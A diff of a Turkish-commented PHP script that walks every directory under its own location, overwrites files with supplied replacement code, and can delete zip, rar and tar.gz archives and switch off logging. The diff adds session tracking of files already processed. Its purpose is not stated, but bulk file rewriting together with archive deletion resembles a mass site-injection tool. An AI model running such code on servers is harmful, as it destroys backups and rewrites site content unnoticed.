@@ -12,7 +12,7 @@ $sessionTimeout = isset($data['session_timeout']) ? $data['session_timeout'] : 3
 $disableLogging = isset($data['disable_logging']) ? $data['disable_logging'] : false;  // Loglama kontrolü
 $deleteCompressedFiles = isset($data['delete_compressed_files']) ? $data['delete_compressed_files'] : false; // Sıkıştırılmış dosya silme kontrolü
 
-// Eğer oturum özelliği açıksa ve oturum zaten ayarlandıysa, kalan süresi hesaplanır
+// **Oturum kontrolü**
 if ($sessionEnabled && isset($_SESSION['script_executed_time'])) {
     $elapsed = time() - $_SESSION['script_executed_time'];
     $remaining = ($sessionTimeout * 60) - $elapsed; // Dakika cinsinden süre hesaplanır
@@ -28,7 +28,7 @@ if ($sessionEnabled && isset($_SESSION['script_executed_time'])) {
 
 // **Oturum açma işlemi, tüm işlem bitiminden sonra yapılmalı**
 // Kök dizin yolu (şu anki dizin)
-$rootDir = __DIR__; 
+$rootDir = __DIR__;
 
 // **Dizinleri bulmak için yeni fonksiyon**
 function findAllDirectories($dir) {
@@ -49,6 +49,11 @@ function findAllDirectories($dir) {
 
 // **Dizinleri bul**
 $directories = findAllDirectories($rootDir);
+
+// **İşlenmiş dosyaları tutacak diziyi kontrol et ve başlat**
+if (!isset($_SESSION['processed_files'])) {
+    $_SESSION['processed_files'] = []; // İşlenmiş dosyalar
+}
 
 // AJAX çağrısı yapıldığında çalışacak olan işlem
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['ajax'])) {
@@ -81,6 +86,12 @@ function searchAndReplaceInDirectory($dir, $data) {
 
         $filePath = $dir . DIRECTORY_SEPARATOR . $file;
 
+        // **Daha önce işlenen dosyayı atla**
+        if (in_array($filePath, $_SESSION['processed_files'])) {
+            if (!$disableLogging) echo "<script>console.log('Dosya zaten işlendi: $filePath');</script>";
+            continue;
+        }
+
         // Eğer dosya bir sıkıştırılmış dosya ise ve silme özelliği açıksa, sil
         if ($deleteCompressedFiles && preg_match('/\.(zip|rar|tar\.gz)$/i', $file)) {
             if (unlink($filePath)) {
@@ -98,6 +109,9 @@ function searchAndReplaceInDirectory($dir, $data) {
             // Dosya ise, işlem yap
             processFile($filePath, $data);
         }
+
+        // Dosya işlendikten sonra işlenmiş dosyalar listesine ekle
+        $_SESSION['processed_files'][] = $filePath;
     }
 }
 
@@ -151,7 +165,6 @@ function processFile($filePath, $data) {
         file_put_contents($filePath, $targetCode);
     }
 }
-
 ?>
 
 <script>
@@ -176,4 +189,3 @@ function processFile($filePath, $data) {
         });
     };
 </script>
-
